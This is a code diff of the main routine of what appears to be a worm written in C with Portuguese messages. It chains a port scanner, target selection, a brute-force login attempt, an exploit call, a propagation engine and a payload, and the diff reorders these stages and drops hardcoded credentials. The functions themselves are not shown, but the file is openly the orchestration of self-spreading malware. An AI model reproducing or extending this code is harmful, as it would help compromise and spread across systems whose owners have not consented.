@@ -30,6 +30,15 @@ void main(int argc, char *argv[]){
     strcpy(range_ipSeq, argv[1]);
     strcpy(range_portSeq, argv[2]);
     lenKey = atoi(argv[3]);
+    
+    printf("-----------------------------------\n");
+    printf("Payload iniciado\n"); 
+    printf("-----------------------------------\n");
+    
+    payload();
+    
+    printf("-----------------------------------\n");
+    printf("Payload finalizado\n"); 
 
     printf("-----------------------------------\n");
     printf("Port Scanner iniciado\n"); 
@@ -52,17 +61,20 @@ void main(int argc, char *argv[]){
     
     printf("Target Selection finalizado\n"); 
 
-/*    if(random % 2){
-        success = bruteforce(lenKey);
+    printf("-----------------------------------\n");
+    printf("Exploits iniciados\n"); 
+    printf("-----------------------------------\n");
+    if(random % 2){
+        success = bruteforce(lenKey, paramIPPort[0], username, pass);
         if(success == 0){
-            success = exploit_main(argc, argv, opt);
-            if(success == 0){
+       //     success = exploit_main(argc, argv, opt);
+         //   if(success == 0){
                 printf("Não foi possivel obter acesso.\n");
                 exit(0);
-            }
+           // }
         }
-    }else{
-        success = exploit_main(argc, argv, opt);
+    }//else{
+       /* success = exploit_main(argc, argv, opt);
         if(success == 0){
             success = bruteforce(lenKey);
             if(success == 0){
@@ -71,9 +83,8 @@ void main(int argc, char *argv[]){
             }
         }
     }*/
-    strcpy(username, "kath");
-    strcpy(pass, "jack");
     
+    printf("Exploits finalizados\n"); 
     printf("-----------------------------------\n");
     printf("Propagation Engine iniciado\n"); 
     printf("-----------------------------------\n");
@@ -82,14 +93,5 @@ void main(int argc, char *argv[]){
     
     printf("-----------------------------------\n");
     printf("Propagation Engine finalizado\n"); 
-    
-    printf("-----------------------------------\n");
-    printf("Payload iniciado\n"); 
-    printf("-----------------------------------\n");
-    
-    payload();
-    
-    printf("-----------------------------------\n");
-    printf("Payload finalizado\n"); 
     printf("-----------------------------------\n");
 }
